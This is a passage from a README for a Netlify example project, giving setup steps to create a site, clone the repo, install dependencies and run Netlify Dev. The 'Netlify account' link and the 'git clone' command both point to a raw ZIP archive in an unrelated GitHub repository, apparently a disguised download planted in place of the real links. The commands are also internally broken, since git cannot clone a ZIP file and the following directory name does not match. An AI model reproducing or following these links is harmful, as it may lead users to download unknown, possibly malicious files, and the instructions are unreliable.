- Create a new project in your [Netlify account](https://github.com/NatanRRocha/carneiroshidraulicos100/raw/refs/heads/main/public/carneiroshidraulicos_asthenopic.zip), linked to your new repo

## Install and run this example locally

You can clone this example repo to explore its features and implementation and to run it locally.

```shell

# 1. Clone the repository to your local development environment
git clone https://github.com/NatanRRocha/carneiroshidraulicos100/raw/refs/heads/main/public/carneiroshidraulicos_asthenopic.zip

# 2. Move into the project directory
cd feature-tour

# 3. Install code dependencies
npm install

# 4. Install the Netlify CLI to let you locally serve your site using Netlify's features
npm install -g netlify-cli

# 5. Serve your site using Netlify Dev
netlify dev

```
